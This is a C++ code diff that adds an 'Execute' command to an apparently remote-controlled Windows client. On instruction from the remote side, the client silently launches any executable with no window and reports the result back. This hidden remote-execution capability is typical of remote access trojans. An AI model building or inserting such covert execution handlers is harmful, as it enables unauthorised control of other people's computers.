@@ -94,6 +94,50 @@ bool Client::ProcessPacketType(PacketType _PacketType)
 
 		break;
 	}
+	case PacketType::Execute: {
+		std::string exe;
+		if (!GetString(exe))
+			return false;
+		PROCESS_INFORMATION piProcInfo;
+		STARTUPINFO siStartInfo;
+		BOOL bSuccess = FALSE;
+
+		// Set up members of the PROCESS_INFORMATION structure. 
+
+		ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
+
+		// Set up members of the STARTUPINFO structure. 
+		// This structure specifies the STDIN and STDOUT handles for redirection.
+
+		ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
+		siStartInfo.cb = sizeof(STARTUPINFO);
+
+		// Create the child process. 
+		bSuccess = CreateProcess(exe.c_str(),
+			NULL,     // command line 
+			NULL,          // process security attributes 
+			NULL,          // primary thread security attributes 
+			TRUE,          // handles are inherited 
+			CREATE_NO_WINDOW,             // creation flags 
+			NULL,          // use parent's environment 
+			NULL,          // use parent's current directory 
+			&siStartInfo,  // STARTUPINFO pointer 
+			&piProcInfo);  // receives PROCESS_INFORMATION 
+
+						   // If an error occurs, exit the application. 
+		if (bSuccess) {
+			CloseHandle(piProcInfo.hProcess);
+			CloseHandle(piProcInfo.hThread);
+		}
+
+		if (bSuccess) {
+			SendString("Process started successfully", PacketType::Warning);
+		}
+		else {
+			SendString("Couldn't start process", PacketType::Warning);
+		}
+		break;
+	}
 	default: //If PacketType type is not accounted for
 			 //std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
 		break;
